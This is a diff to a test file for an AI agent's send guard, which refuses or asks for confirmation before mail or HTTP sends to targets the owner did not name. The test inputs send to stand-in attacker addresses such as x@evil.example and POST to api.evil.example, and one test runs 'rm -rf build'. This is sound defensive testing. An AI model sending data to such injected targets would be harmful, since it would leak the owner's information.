@@ -73,7 +73,7 @@ describe('in the owner\'s chat', () => {
     const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('send the report'), sendOrigin: origin });
     const result = await call(agent, 'mail_send', { to: ['x@evil.example'] });
     expect(ask.asked).toHaveLength(1);
-    expect(ask.asked[0]!.question).toContain('you did not name the recipient "x@evil.example". It comes from a conversation helper@example.invalid started. Send anyway?');
+    expect(ask.asked[0]!.question).toContain('you did not name the recipient "x@evil.example". It comes from a conversation "helper@example.invalid" started. Send anyway?');
     expect(ask.asked[0]!.question).toContain('A yes applies to this one send only.');
     expect(ask.asked[0]!.meta?.blocked).toBe(true);
     expect(tool.calls).toEqual([]);
@@ -190,13 +190,13 @@ describe('where nobody can be asked, the send is refused and nothing is parked',
       };
       const refused: unknown[] = [];
       const tool = sender();
-      const origin: SendOrigin = { kind: 'triggerRun', name: 'Wochenbericht', author: 'helper@example.invalid' };
+      const origin: SendOrigin = { kind: 'triggerRun', name: 'Wochenbericht', setUpBy: { kind: 'other', who: 'helper@example.invalid' } };
       const agent = agentOf({ tools: [tool], promptUser, autonomy: 'autonomous', sendOrigin: origin, onOriginRefused: (r: unknown) => refused.push(r) });
       const result = await call(agent, 'mail_send', { to: ['x@evil.example'] });
       expect(store.getPending('run-thread')).toBeUndefined();
       expect(tool.calls).toEqual([]);
-      expect(String(result.content)).toContain('Not sent: the owner did not name "x@evil.example"; it comes from the trigger "Wochenbericht" set up by helper@example.invalid. A run without a reader cannot ask the owner');
-      expect(refused).toEqual([{ target: 'x@evil.example', noun: 'mail', origin }]);
+      expect(String(result.content)).toContain('Not sent: the owner did not name "x@evil.example"; it comes from the trigger "Wochenbericht" set up by "helper@example.invalid". A run without a reader cannot ask the owner');
+      expect(refused).toEqual([{ targets: { values: ['x@evil.example'], unreadable: false }, noun: 'mail', origin }]);
     } finally {
       history.close();
     }
@@ -208,6 +208,24 @@ describe('where nobody can be asked, the send is refused and nothing is parked',
     const result = await call(agent, 'http_request', { url: 'https://api.evil.example/x' });
     expect(tool.calls).toEqual([]);
     expect(String(result.content)).toContain('Not sent: the owner did not name "api.evil.example"; it comes from the workflow "Abgleich".');
+  });
+
+  it('a write the guard refuses without asking keeps the guard\'s text, and the run still learns where the target came from', async () => {
+    const refused: unknown[] = [];
+    const tool = sender('http_request', { requiresConfirmation: false });
+    const agent = agentOf({ tools: [tool], autonomy: 'autonomous', sendOrigin: { kind: 'workflowRun', name: 'Abgleich' }, onOriginRefused: (r: unknown) => refused.push(r) });
+    const result = await call(agent, 'http_request', { url: 'https://api.evil.example/x', method: 'POST', body: '{}' });
+    expect(tool.calls).toEqual([]);
+    expect(String(result.content)).toContain('Permission denied (non-interactive)');
+    expect(refused).toEqual([{ targets: { values: ['api.evil.example'], unreadable: false }, noun: 'host', origin: { kind: 'workflowRun', name: 'Abgleich' } }]);
+  });
+
+  it('CONTROL: the guard\'s refusal of a write to a target the owner named reports nothing', async () => {
+    const refused: unknown[] = [];
+    const agent = agentOf({ tools: [sender('http_request', { requiresConfirmation: false })], autonomy: 'autonomous', ownerKnown: owner('api.evil.example'), onOriginRefused: (r: unknown) => refused.push(r) });
+    const result = await call(agent, 'http_request', { url: 'https://api.evil.example/x', method: 'POST', body: '{}' });
+    expect(String(result.content)).toContain('Permission denied (non-interactive)');
+    expect(refused).toEqual([]);
   });
 
   it('a child of a trigger run (its prompt passes the blocked meta on): refused', async () => {
@@ -312,6 +330,7 @@ describe('bash: no target to compare, a sentence on the network question once ou
     const tainted = agentOf({ tools: [bash()], promptUser: ask.fn });
     tainted.noteUntrustedData();
     await call(tainted, 'bash', { command: 'rm -rf build' });
-    for (const a of ask.asked.slice(1)) expect(a.question).not.toContain('already read outside content');
+    expect(ask.asked, 'the command that sends nothing is still asked about').toHaveLength(2);
+    expect(ask.asked[1]!.question).not.toContain('already read outside content');
   });
 });
